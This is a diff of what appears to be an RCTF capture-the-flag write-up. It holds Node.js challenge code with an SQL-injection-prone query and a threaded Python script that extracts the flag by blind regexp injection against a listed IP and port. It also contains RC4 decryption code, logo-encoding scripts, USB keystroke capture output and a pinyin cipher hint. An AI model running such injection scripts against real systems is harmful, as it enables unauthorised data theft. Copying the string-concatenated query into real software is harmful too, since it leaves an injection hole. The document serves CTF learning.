@@ -5,12 +5,15 @@
 
 app.post("/key1", (req, res) => { const { key1 } = req.body; if (key1.length > 52 || !isSafe(key1)) { return res.send("love waf"); } let res1 = `SELECT * FROM key1 WHERE love_key = '${key1}'`; db.query(`SELECT * FROM key1 WHERE love_key = '${key1}'`, (err, results) => { if (err) { res.send("error"); } else if (results.length > 0) { res.send("success"); } else { res.send("wrong"); } }); });
 
-import requests import string import threading from queue import Queue payloads = "'||love_key regexp '{}" flags='^RCTF{' # flags='.*GET_T' all=string.digits+string.ascii_uppercase+"_-!%&" def step(payload,flag,i,queue): mess=payload.format(flag+i) # print(mess) req=requests.post('http://1.94.13.174:10088/key1',data={'key1':mess}) # print(req.text) if 'success' in req.text: flag+=i print(flag) queue.put(flag) queue = Queue() for i in range(1,50): t_list=[] for m in all: t=threading.Thread(target=step,args=(payloads,flags,m,queue)) t_list.append(t) t.start() for t in t_list: t.join() try: flags=queue.get(True,1) print(flags) while not queue.empty(): queue.get() except: print('error') exit(0) # '||love_key regexp 'RCTF{THE_FIRST_STEP_IS_TO_GET_T # '||love_key regexp '.*GET_TO_KNOW
+import requests import string import threading from queue import Queue payloads = "'||love_key regexp '{}" flags='^RCTF{' # flags='.*GET_T' all=string.digits+string.ascii_uppercase+"_-!%&" def step(payload,flag,i,queue): mess=payload.format(flag+i) # print(mess) req=requests.post('http://1.94.13.174:
+10088/key1',data={'key1':
+mess}) # print(req.text) if 'success' in req.text: flag+=i print(flag) queue.put(flag) queue = Queue() for i in range(1,50): t_list=[] for m in all: t=threading.Thread(target=step,args=(payloads,flags,m,queue)) t_list.append(t) t.start() for t in t_list: t.join() try: flags=queue.get(True,1) print(flags) while not queue.empty(): queue.get() 
+except: print('error') exit(0) # '||love_key regexp 'RCTF{THE_FIRST_STEP_IS_TO_GET_T # '||love_key regexp '.*GET_TO_KNOW
 
 app.post("/key2", (req, res) => { let { username, love_time } = req.body; let userInfo = {}; userInfo.username = username; userInfo.love_time = Number(love_time); if (userInfo.love_time < 10000 || typeof userInfo.love_time !== "number") { res.send( "There was once a sincere love in front of me, I didn't cherish it, andI regretted it when I lost it, and the most painful thing in the world isnothing more than this. If God could give me a chance to start over, I wouldsay three words to that girl: I love you. If I had to put a deadline on thislove, I would say 10,000 years." ); } let have_lovers = false; if ( userInfo.username === my_lover.username && userInfo.love_time === my_lover.love_time ) { have_lovers = true; } let token = auth.createToken({ username: userInfo.username, love_time: userInfo.love_time, have_lovers: have_lovers, }); res.send(`give your a love token:${token}`); });
  app.post("/check", (req, res) => { let { love_token } = req.body; const [userinfo, err] = auth.decodeToken(love_token); if (err) { res.send("error"); return; } if (userinfo.have_lovers) { res.send(`your key2 is ${key2}`); } else { res.send("your have not lover"); } });
 
-#include <stdio.h> #include <stdint.h> #include <bits/stdc++.h> #include<stdio.h> /* RC4初始化函数 */ void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k) { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i < 256; i++) { s[i] = i; k[i] = key[i % Len_k]; } for (i = 0; i < 256; i++) { j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; } } /* RC4加解密函数 unsigned char* Data 加解密的数据 unsigned long Len_D 加解密数据的⻓度 unsigned char* key 密钥 unsigned long Len_k 密钥⻓度 */ void rc4_crypt(unsigned char* Data, unsigned long Len_D, unsigned char* key,unsigned long Len_k) //加解密 { unsigned char s[256]; rc4_init(s, key, Len_k); int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k < Len_D; k++) { i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] = Data[k] ^ s[t]; } } int main() { //字符串密钥 unsigned char key[] = "thisisyoursecretke"; unsigned long key_len = sizeof(key) - 1; //数组密钥 //unsigned char key[] = {}; //unsigned long key_len = sizeof(key);
+#include <stdio.h> #include <stdint.h> #include  #include<stdio.h> /* RC4初始化函数 */ void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k) { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i < 256; i++) { s[i] = i; k[i] = key[i % Len_k]; } for (i = 0; i < 256; i++) { j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; } } /* RC4加解密函数 unsigned char* Data 加解密的数据 unsigned long Len_D 加解密数据的⻓度 unsigned char* key 密钥 unsigned long Len_k 密钥⻓度 */ void rc4_crypt(unsigned char* Data, unsigned long Len_D, unsigned char* key,unsigned long Len_k) //加解密 { unsigned char s[256]; rc4_init(s, key, Len_k); int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k < Len_D; k++) { i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] = Data[k] ^ s[t]; } } int main() { //字符串密钥 unsigned char key[] = "thisisyoursecretke"; unsigned long key_len = sizeof(key) - 1; //数组密钥 //unsigned char key[] = {}; //unsigned long key_len = sizeof(key);
  unsigned char flag[]="RCTF"; for (int i=0;i<4;i++){ flag[i]^=0x7d; flag[i]=((flag[i] << 6) | (flag[i] >> 2) )& 0xff;
  } for (int i=0;i<4;i++) printf("0x%x,",flag[i]); rc4_crypt(flag, sizeof(flag), key, key_len); for (int i=0;i<4;i++) printf("0x%x,",flag[i]); //加解密数据 unsigned char data[] ={0x80,0x5,0xe3,0x2f,0x18,0x2f,0xc5,0x8c,0x25,0x70,0xbc, 0x5,0x1c,0x4f,0xf2,0x2,0xe5,0x3e,0x2 ,0x2f,0xe5,0x11,0xa3,0xc0, }; //for (int i=0;i<25;i++) printf("%x",data[i]); //加解密
  rc4_crypt(data, sizeof(data), key, key_len); for (int i=0;i<4;i++) printf("0x%x,",data[i]); for (int i=0;i<25;i++){
@@ -20,9 +23,11 @@ app.post("/key2", (req, res) => { let { username, love_time } = req.body;
 
 logo ="####################################################################################################a############################ ######################################################################a###### ########### ## ## ########### ##############a#### ## ######### ################ ###a#### ######## ################################## ############# ############ ##a############### ###### ########### ############## ###############################a### ############# ##### ######################## ############ ###################a### ################## ############# ############# ################################a### ############## ### ######################### ############## #################a### ################# ############### ############ ##############################a### ############## #### ############### ############################# #############a### ############# ################### ########### #################### ##########a############### ##### ############### ################################# #########a### #### #################### ########### ######################## #######a####### ######## ############# ##################################### ######a### ######### ###################### ############ ########################## ######a############# ######## ########### ####################################### ######a### ########### ################# ############# ############# ######### ######a############### ######### ###### ############ ################### #######a### ############## ########### ##################### #########a#### #########################################################################################a####################################################################################################" logo = logo.replace('a',chr(10))
 
-'9:;<!$&-89;<>HSfn{!$&1:ISfl~!$,3;@Z^ko{x7f!$/4:>ILZ^jn $15:>IMZ^jn$259=JMZ]jn $269=JNZ]kp $269<KNZ]lr $259<KNZ]nt $159<KNY]qw $049<KNY]sx$(39<JNY]uz $(19=JNY]w{ $-1:=JMY]w{ $.2:>ILY]w{ $/3;?HLY]jnw{ $03<AGJV]lquz#12=FRdmx!"ACqu'[idx] ⼤致共240个字节
+'9:;<!$&-89;<>HSfn{!$&1:
+ISfl~!$,3;@Z^ko{x7f!$/4:>ILZ^jn $15:>IMZ^jn$259=JMZ]jn $269=JNZ]kp $269<KNZ]lr $259<KNZ]nt $159<KNY]qw $049<KNY]sx$(39<JNY]uz $(19=JNY]w{ $-1:=JMY]w{ $.2:>ILY]w{ $/3;?HLY]jnw{ $03<AGJV]lquz#12=FRdmx!"ACqu'[idx] ⼤致共240个字节
 
-s=' ' c='#' logo='#'*100+'n' idx=0 t=0 while idx<228: i='9:;<!$&-89;<>HSfn{!$&1:ISfl~!$,3;@Z^ko{x7f!$/4:>ILZ^jn $15:>IMZ^jn$259=JMZ]jn $269=JNZ]kp $269<KNZ]lr $259<KNZ]nt $159<KNY]qw $049<KNY]sx$(39<JNY]uz $(19=JNY]w{ $-1:=JMY]w{ $.2:>ILY]w{ $/3;?HLY]jnw{ $03<AGJV]lquz#12=FRdmx!"ACqu'[idx] b=ord(i)-29 if t>b: logo=logo+c*(100-t)+'n' t=0 logo=logo+c*(b-t) if c=='#':c=' ' else:c='#' t=b idx=idx+1 logo=logo+12*'#'+'n'+'#'*100
+s=' ' c='#' logo='#'*100+'n' idx=0 t=0 while idx<228: i='9:;<!$&-89;<>HSfn{!$&1:
+ISfl~!$,3;@Z^ko{x7f!$/4:>ILZ^jn $15:>IMZ^jn$259=JMZ]jn $269=JNZ]kp $269<KNZ]lr $259<KNZ]nt $159<KNY]qw $049<KNY]sx$(39<JNY]uz $(19=JNY]w{ $-1:=JMY]w{ $.2:>ILY]w{ $/3;?HLY]jnw{ $03<AGJV]lquz#12=FRdmx!"ACqu'[idx] b=ord(i)-29 if t>b: logo=logo+c*(100-t)+'n' t=0 logo=logo+c*(b-t) if c=='#':c=' ' else:c='#' t=b idx=idx+1 logo=logo+12*'#'+'n'+'#'*100
 
 [+] USB_Found : ['n', 'i', 'u', 'o', '<SPACE>', 'y', 'b', 'u', 'f', 'm', 'e','f', 'h', 'u', 'i', '<SPACE>', 'k', 'j', 'q', 'i', 'l', 'l', 'x', 'd', 'j','w', 'm', 'i', '<SPACE>', 'u', 'i', 'z', 'e', 'b', 'u', 'u', 'i', '<SPACE>','<RET>', 'd', 'v', 'o', 'o', '<SPACE>', '<RET>', 'u', 'd', 'p', 'n','<SPACE>', 'u', 'i', 'b', 'u', 'u', 'i', '<SPACE>', 'j', 'q', 'y', 'b', 'd','m', '<SPACE>', 'v', 'e', 'g', 'e', 'y', 'i', 's', 'i', '<SPACE>', '<RET>','v', 'e', 'm', 'e', 'u', 'o', 'l', 'l', '<SPACE>', 'j', 'x', 'y', 's', 'g','o', 'w', 'o', 'd', 'm', 'n', 'k', 'd', 'e', 'r', 'f', '<SPACE>', 'd', 'b','m', 'z', 'f', 'a', '<SPACE>', 'h', 'k', 'h', 'k', 'd', 'a', 'z', 'i','<SPACE>', '<RET>', 'z', 'v', 'j', 'n', 'y', 'b', 'u', 'f', 'm', 'e','<SPACE>', 'h', 'k', 'w', 'j', 'd', 'e', 'g', 'g', 'm', 'a', '<SPACE>','<RET>', 'n', 'a', '<SPACE>', 'm', 'i', 'm', 'a', 'j', 'q', 'u', 'e', 'v','i', 'i', 'g', '<SPACE>', '<RET>', 'k', 'y', 'l', 'l', 'd', 'a', '<SPACE>','d', 'o', 'q', 'i', 's', 'l', '<SPACE>', 'b', 'a', '<SPACE>', '<RET>', 'p','n', 'y', 'n', 'q', 'r', 'p', 'n', '<SPACE>', '<RET>', 'q', 'r', 'x', 'c','x', 'x', 'z', 'i', 'm', 'u', '<SPACE>', '<RET>'
 
@@ -33,66 +38,26 @@ niuo ybufmefhui kjqillxdjwmi uizebuuidvooudpn uibuui jqybdm vegeyisivemeuoll�
 
 ```
 app.post("/key1", (req, res) => { const { key1 } = req.body; if (key1.length > 52 || !isSafe(key1)) { return res.send("love waf"); } let res1 = `SELECT * FROM key1 WHERE love_key = '${key1}'`; db.query(`SELECT * FROM key1 WHERE love_key = '${key1}'`, (err, results) => { if (err) { res.send("error"); } else if (results.length > 0) { res.send("success"); } else { res.send("wrong"); } }); });
-```
-
-
-
-```
-import requests import string import threading from queue import Queue payloads = "'||love_key regexp '{}" flags='^RCTF{' # flags='.*GET_T' all=string.digits+string.ascii_uppercase+"_-!%&" def step(payload,flag,i,queue): mess=payload.format(flag+i) # print(mess) req=requests.post('http://1.94.13.174:10088/key1',data={'key1':mess}) # print(req.text) if 'success' in req.text: flag+=i print(flag) queue.put(flag) queue = Queue() for i in range(1,50): t_list=[] for m in all: t=threading.Thread(target=step,args=(payloads,flags,m,queue)) t_list.append(t) t.start() for t in t_list: t.join() try: flags=queue.get(True,1) print(flags) while not queue.empty(): queue.get() except: print('error') exit(0) # '||love_key regexp 'RCTF{THE_FIRST_STEP_IS_TO_GET_T # '||love_key regexp '.*GET_TO_KNOW
-```
-
-
-
-```
+import requests import string import threading from queue import Queue payloads = "'||love_key regexp '{}" flags='^RCTF{' # flags='.*GET_T' all=string.digits+string.ascii_uppercase+"_-!%&" def step(payload,flag,i,queue): mess=payload.format(flag+i) # print(mess) req=requests.post('http://1.94.13.174:
+10088/key1',data={'key1':
+mess}) # print(req.text) if 'success' in req.text: flag+=i print(flag) queue.put(flag) queue = Queue() for i in range(1,50): t_list=[] for m in all: t=threading.Thread(target=step,args=(payloads,flags,m,queue)) t_list.append(t) t.start() for t in t_list: t.join() try: flags=queue.get(True,1) print(flags) while not queue.empty(): queue.get() 
+except: print('error') exit(0) # '||love_key regexp 'RCTF{THE_FIRST_STEP_IS_TO_GET_T # '||love_key regexp '.*GET_TO_KNOW
 app.post("/key2", (req, res) => { let { username, love_time } = req.body; let userInfo = {}; userInfo.username = username; userInfo.love_time = Number(love_time); if (userInfo.love_time < 10000 || typeof userInfo.love_time !== "number") { res.send( "There was once a sincere love in front of me, I didn't cherish it, andI regretted it when I lost it, and the most painful thing in the world isnothing more than this. If God could give me a chance to start over, I wouldsay three words to that girl: I love you. If I had to put a deadline on thislove, I would say 10,000 years." ); } let have_lovers = false; if ( userInfo.username === my_lover.username && userInfo.love_time === my_lover.love_time ) { have_lovers = true; } let token = auth.createToken({ username: userInfo.username, love_time: userInfo.love_time, have_lovers: have_lovers, }); res.send(`give your a love token:${token}`); });
  app.post("/check", (req, res) => { let { love_token } = req.body; const [userinfo, err] = auth.decodeToken(love_token); if (err) { res.send("error"); return; } if (userinfo.have_lovers) { res.send(`your key2 is ${key2}`); } else { res.send("your have not lover"); } });
-```
-
-
-
-```
-#include <stdio.h> #include <stdint.h> #include <bits/stdc++.h> #include<stdio.h> /* RC4初始化函数 */ void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k) { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i < 256; i++) { s[i] = i; k[i] = key[i % Len_k]; } for (i = 0; i < 256; i++) { j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; } } /* RC4加解密函数 unsigned char* Data 加解密的数据 unsigned long Len_D 加解密数据的⻓度 unsigned char* key 密钥 unsigned long Len_k 密钥⻓度 */ void rc4_crypt(unsigned char* Data, unsigned long Len_D, unsigned char* key,unsigned long Len_k) //加解密 { unsigned char s[256]; rc4_init(s, key, Len_k); int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k < Len_D; k++) { i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] = Data[k] ^ s[t]; } } int main() { //字符串密钥 unsigned char key[] = "thisisyoursecretke"; unsigned long key_len = sizeof(key) - 1; //数组密钥 //unsigned char key[] = {}; //unsigned long key_len = sizeof(key);
+    #include <stdio.h> #include <stdint.h> #include  #include<stdio.h> /* RC4初始化函数 */ void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k) { int i = 0, j = 0; char k[256] = { 0 }; unsigned char tmp = 0; for (i = 0; i < 256; i++) { s[i] = i; k[i] = key[i % Len_k]; } for (i = 0; i < 256; i++) { j = (j + s[i] + k[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; } } /* RC4加解密函数 unsigned char* Data 加解密的数据 unsigned long Len_D 加解密数据的⻓度 unsigned char* key 密钥 unsigned long Len_k 密钥⻓度 */ void rc4_crypt(unsigned char* Data, unsigned long Len_D, unsigned char* key,unsigned long Len_k) //加解密 { unsigned char s[256]; rc4_init(s, key, Len_k); int i = 0, j = 0, t = 0; unsigned long k = 0; unsigned char tmp; for (k = 0; k < Len_D; k++) { i = (i + 1) % 256; j = (j + s[i]) % 256; tmp = s[i]; s[i] = s[j]; s[j] = tmp; t = (s[i] + s[j]) % 256; Data[k] = Data[k] ^ s[t]; } } int main() { //字符串密钥 unsigned char key[] = "thisisyoursecretke"; unsigned long key_len = sizeof(key) - 1; //数组密钥 //unsigned char key[] = {}; //unsigned long key_len = sizeof(key);
  unsigned char flag[]="RCTF"; for (int i=0;i<4;i++){ flag[i]^=0x7d; flag[i]=((flag[i] << 6) | (flag[i] >> 2) )& 0xff;
  } for (int i=0;i<4;i++) printf("0x%x,",flag[i]); rc4_crypt(flag, sizeof(flag), key, key_len); for (int i=0;i<4;i++) printf("0x%x,",flag[i]); //加解密数据 unsigned char data[] ={0x80,0x5,0xe3,0x2f,0x18,0x2f,0xc5,0x8c,0x25,0x70,0xbc, 0x5,0x1c,0x4f,0xf2,0x2,0xe5,0x3e,0x2 ,0x2f,0xe5,0x11,0xa3,0xc0, }; //for (int i=0;i<25;i++) printf("%x",data[i]); //加解密
  rc4_crypt(data, sizeof(data), key, key_len); for (int i=0;i<4;i++) printf("0x%x,",data[i]); for (int i=0;i<25;i++){
  data[i]=((data[i] >> 6) | (data[i] << 2) )& 0x3f; data[i]^=0x7d;
  }
  for (int i = 0; i < sizeof(data); i++) { printf("%c", data[i]); } printf("n"); return 0; }
-```
-
-
-
-```
 logo ="####################################################################################################a############################ ######################################################################a###### ########### ## ## ########### ##############a#### ## ######### ################ ###a#### ######## ################################## ############# ############ ##a############### ###### ########### ############## ###############################a### ############# ##### ######################## ############ ###################a### ################## ############# ############# ################################a### ############## ### ######################### ############## #################a### ################# ############### ############ ##############################a### ############## #### ############### ############################# #############a### ############# ################### ########### #################### ##########a############### ##### ############### ################################# #########a### #### #################### ########### ######################## #######a####### ######## ############# ##################################### ######a### ######### ###################### ############ ########################## ######a############# ######## ########### ####################################### ######a### ########### ################# ############# ############# ######### ######a############### ######### ###### ############ ################### #######a### ############## ########### ##################### #########a#### #########################################################################################a####################################################################################################" logo = logo.replace('a',chr(10))
-```
-
-
-
-```
-'9:;<!$&-89;<>HSfn{!$&1:ISfl~!$,3;@Z^ko{x7f!$/4:>ILZ^jn $15:>IMZ^jn$259=JMZ]jn $269=JNZ]kp $269<KNZ]lr $259<KNZ]nt $159<KNY]qw $049<KNY]sx$(39<JNY]uz $(19=JNY]w{ $-1:=JMY]w{ $.2:>ILY]w{ $/3;?HLY]jnw{ $03<AGJV]lquz#12=FRdmx!"ACqu'[idx] ⼤致共240个字节
-```
-
-
-
-```
-s=' ' c='#' logo='#'*100+'n' idx=0 t=0 while idx<228: i='9:;<!$&-89;<>HSfn{!$&1:ISfl~!$,3;@Z^ko{x7f!$/4:>ILZ^jn $15:>IMZ^jn$259=JMZ]jn $269=JNZ]kp $269<KNZ]lr $259<KNZ]nt $159<KNY]qw $049<KNY]sx$(39<JNY]uz $(19=JNY]w{ $-1:=JMY]w{ $.2:>ILY]w{ $/3;?HLY]jnw{ $03<AGJV]lquz#12=FRdmx!"ACqu'[idx] b=ord(i)-29 if t>b: logo=logo+c*(100-t)+'n' t=0 logo=logo+c*(b-t) if c=='#':c=' ' else:c='#' t=b idx=idx+1 logo=logo+12*'#'+'n'+'#'*100
-```
-
-
-
-```
+'9:;<!$&-89;<>HSfn{!$&1:
+ISfl~!$,3;@Z^ko{x7f!$/4:>ILZ^jn $15:>IMZ^jn$259=JMZ]jn $269=JNZ]kp $269<KNZ]lr $259<KNZ]nt $159<KNY]qw $049<KNY]sx$(39<JNY]uz $(19=JNY]w{ $-1:=JMY]w{ $.2:>ILY]w{ $/3;?HLY]jnw{ $03<AGJV]lquz#12=FRdmx!"ACqu'[idx] ⼤致共240个字节
+s=' ' c='#' logo='#'*100+'n' idx=0 t=0 while idx<228: i='9:;<!$&-89;<>HSfn{!$&1:
+ISfl~!$,3;@Z^ko{x7f!$/4:>ILZ^jn $15:>IMZ^jn$259=JMZ]jn $269=JNZ]kp $269<KNZ]lr $259<KNZ]nt $159<KNY]qw $049<KNY]sx$(39<JNY]uz $(19=JNY]w{ $-1:=JMY]w{ $.2:>ILY]w{ $/3;?HLY]jnw{ $03<AGJV]lquz#12=FRdmx!"ACqu'[idx] b=ord(i)-29 if t>b: logo=logo+c*(100-t)+'n' t=0 logo=logo+c*(b-t) if c=='#':c=' ' else:c='#' t=b idx=idx+1 logo=logo+12*'#'+'n'+'#'*100
 [+] USB_Found : ['n', 'i', 'u', 'o', '<SPACE>', 'y', 'b', 'u', 'f', 'm', 'e','f', 'h', 'u', 'i', '<SPACE>', 'k', 'j', 'q', 'i', 'l', 'l', 'x', 'd', 'j','w', 'm', 'i', '<SPACE>', 'u', 'i', 'z', 'e', 'b', 'u', 'u', 'i', '<SPACE>','<RET>', 'd', 'v', 'o', 'o', '<SPACE>', '<RET>', 'u', 'd', 'p', 'n','<SPACE>', 'u', 'i', 'b', 'u', 'u', 'i', '<SPACE>', 'j', 'q', 'y', 'b', 'd','m', '<SPACE>', 'v', 'e', 'g', 'e', 'y', 'i', 's', 'i', '<SPACE>', '<RET>','v', 'e', 'm', 'e', 'u', 'o', 'l', 'l', '<SPACE>', 'j', 'x', 'y', 's', 'g','o', 'w', 'o', 'd', 'm', 'n', 'k', 'd', 'e', 'r', 'f', '<SPACE>', 'd', 'b','m', 'z', 'f', 'a', '<SPACE>', 'h', 'k', 'h', 'k', 'd', 'a', 'z', 'i','<SPACE>', '<RET>', 'z', 'v', 'j', 'n', 'y', 'b', 'u', 'f', 'm', 'e','<SPACE>', 'h', 'k', 'w', 'j', 'd', 'e', 'g', 'g', 'm', 'a', '<SPACE>','<RET>', 'n', 'a', '<SPACE>', 'm', 'i', 'm', 'a', 'j', 'q', 'u', 'e', 'v','i', 'i', 'g', '<SPACE>', '<RET>', 'k', 'y', 'l', 'l', 'd', 'a', '<SPACE>','d', 'o', 'q', 'i', 's', 'l', '<SPACE>', 'b', 'a', '<SPACE>', '<RET>', 'p','n', 'y', 'n', 'q', 'r', 'p', 'n', '<SPACE>', '<RET>', 'q', 'r', 'x', 'c','x', 'x', 'z', 'i', 'm', 'u', '<SPACE>', '<RET>'
-```
-
-
-
-```
 niuo ybufmefhui kjqillxdjwmi uizebuuidvooudpn uibuui jqybdm vegeyisivemeuoll jxysgowodmnkderf dbmzfa hkhkdazizvjnybufme hkwjdeggmana mimajqueviigkyllda doqisl bapnynqrpnqrxcxxzimu
-```
-
-
-
-```
 你说 有什么⽅式 看起来像加密 实则不是对哦 双拼 是不是 就有点 这个意思这么说来 最近有什么 好玩的梗吗那密码就设置成快来打夺旗赛吧拼⾳全拼 全⼩写字⺟
 ```
 
